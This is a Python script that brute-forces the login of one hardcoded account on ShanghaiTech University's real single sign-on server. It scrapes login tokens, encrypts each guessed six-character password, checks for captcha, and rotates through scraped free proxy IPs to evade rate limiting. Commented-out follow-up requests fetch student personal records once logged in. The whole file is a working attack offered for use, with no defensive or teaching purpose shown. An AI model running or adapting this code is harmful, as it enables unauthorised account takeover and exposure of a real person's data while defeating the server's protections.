import requests
from login_encrypt import encrypt_password
import time
import random, re
from PIL import Image
from io import BytesIO

proxy = False


def login(username, password, use_proxy=False):
    cookies = {
        'Max-Age': '0',
        'org.springframework.web.servlet.i18n.CookieLocaleResolver.LOCALE': 'zh_CN',
        'JSESSIONID': '',
        'route': '',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'null',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0',
        'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Microsoft Edge";v="134"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'username': username,
        'password': '',
        'captcha': '',
        '_eventId': 'submit',
        'cllt': 'userNameLogin',
        'dllt': 'generalLogin',
        'lt': '',
        'execution': '',
    }
    fake_ip = ''
    if use_proxy:
        fake_ip = get_fake_IP()
        print("使用代理IP：", fake_ip)
    from bs4 import BeautifulSoup as bs

    s = requests.Session()
    s.headers.update(headers)
    first_response = s.get(
        "https://ids.shanghaitech.edu.cn/authserver/login?service=https%3A%2F%2Fegate-new.shanghaitech.edu.cn%2Flogin",
        cookies=cookies,
        headers=headers,
    )
    bs1 = bs(first_response.text, 'lxml')
    salt = bs1.select("#pwdEncryptSalt")[0]['value']
    excution = bs1.select("#execution")[0]['value']
    s.cookies.update(first_response.cookies)
    # isNeedCaptcha response
    response = s.get(
        f"https://ids.shanghaitech.edu.cn/authserver/checkNeedCaptcha.htl?username={username}&_={int(time.time()*1000)}",
        proxies={'http': fake_ip} if use_proxy else None,
    )

    isNeed = response.json().get("isNeed")
    print("是否触发验证码：", isNeed)
    if isNeed:
        global proxy
        proxy = True
        bs1 = bs(response.text, 'lxml')
        captcha_src = bs1.select_one("img#captchaImg")
        if not captcha_src:
            print("验证码获取失败")
            return False
        captcha_src = captcha_src.get("src")

        captcha_response = s.get(
            "https://ids.shanghaitech.edu.cn"
            + captcha_src
            + f"?{int(time.time()*1000)}",
        )

        image = Image.open(BytesIO(captcha_response.content))
        image.show()

        s.close()
        return False

    pwd = encrypt_password(password, salt)

    data['password'] = pwd
    data['execution'] = excution
    # login response
    response = s.post(
        "https://ids.shanghaitech.edu.cn/authserver/login?service=https%3A%2F%2Fegate-new.shanghaitech.edu.cn%2Flogin",
        data=data,
        proxies={'http': fake_ip} if use_proxy else None,
    )

    s.cookies.update(response.cookies)

    login_success = False
    if response.status_code == 200:
        print("Login success")
        login_success = True
        return login_success, s

    # get_login_user_response = s.get("https://egate-new.shanghaitech.edu.cn/getLoginUser")

    # print(get_login_user_response.text)

    # response_hall = s.get("https://egate-new.shanghaitech.edu.cn/blue/index.html")
    # new_response = s.get(
    #     "https://egate.shanghaitech.edu.cn/xsfw/sys/jbxxapp/*default/index.do"
    # )
    # s.cookies.update(new_response.cookies)
    # new_response = s.get(
    #     "https://egate.shanghaitech.edu.cn/xsfw/sys/emappagelog/config/jbxxapp.do"
    # )
    # s.cookies.update(new_response.cookies)
    # new_response = s.post(
    #     # "https://eams.shanghaitech.edu.cn/eams/home!submenus.action?menu.id="
    #     "https://egate.shanghaitech.edu.cn/xsfw/sys/jbxxapp/modules/jbxx.do",
    #     data={"*json": 1},
    # )
    # print(new_response.text)
    # detailed_info_response = s.post(
    #     "https://egate.shanghaitech.edu.cn/xsfw/sys/jbxxapp/commoncall/callQuery.do",
    #     data={
    #         "requestParams": '{"XSBH": "..."}',
    #         "actionType": "MINE",
    #         "actionName": "xsjbxxcx",
    #     },
    # )

    # print(detailed_info_response.text)

    s.close()
    return login_success


def get_fake_IP():
    ip_page = requests.get(  # 获取200条IP
        'http://www.89ip.cn/tqdl.html?num=60&address=&kill_address=&port=&kill_port=&isp='
    )
    proxies_list = re.findall(
        r'(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)\.(25[0-5]|2[0-4]\d|[0-1]\d{2}|[1-9]?\d)(:-?[1-9]\d*)',
        ip_page.text,
    )

    # 转换proxies_list的元素为list,最初为'tuple'元组格式
    proxies_list = list(map(list, proxies_list))

    # 格式化ip  ('112', '111', '217', '188', ':9999')  --->  112.111.217.188:9999
    for u in range(0, len(proxies_list)):
        # 通过小数点来连接为字符
        proxies_list[u] = '.'.join(proxies_list[u])
        # 用rindex()查找最后一个小数点的位置，
        index = proxies_list[u].rindex('.')
        # 将元素转换为list格式
        proxies_list[u] = list(proxies_list[u])
        # 修改位置为index的字符为空白（去除最后一个小数点）
        proxies_list[u][index] = ''
        # 重新通过空白符连接为字符
        proxies_list[u] = ''.join(proxies_list[u])

    # proxies = {'协议':'协议://IP:端口号'}
    # 'https':'https://59.172.27.6:38380'

    return "'" + random.choice(proxies_list) + "'"


def brute_force_pwd_generate(
    lexi_index, min_len, max_len, use_number=False, use_capital=False, use_special=False
):
    # 0: number, 1: capital, 2: special
    char_set = ['0123456789', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', '!@#$%^&*()_+']
    char_set_str = ''
    if use_number:
        char_set_str += char_set[0]
    if use_capital:
        char_set_str += char_set[1]
    if use_special:
        char_set_str += char_set[2]
    if not use_number and not use_capital and not use_special:
        char_set_str = char_set[1].lower()
    char_set_len = len(char_set_str)
    pwd = ''
    while lexi_index > 0:
        pwd += char_set_str[lexi_index % char_set_len]
        lexi_index = lexi_index // char_set_len
    pwd = pwd.ljust(min_len, char_set_str[0])
    return pwd[::-1]


if __name__ == "__main__":
    username = "101196"
    i = 0
    while True:

        password = brute_force_pwd_generate(i, 6, 6)
        if login(username, password, proxy):
            break
        else:
            print(f"登录失败:{password}")
            i += 1
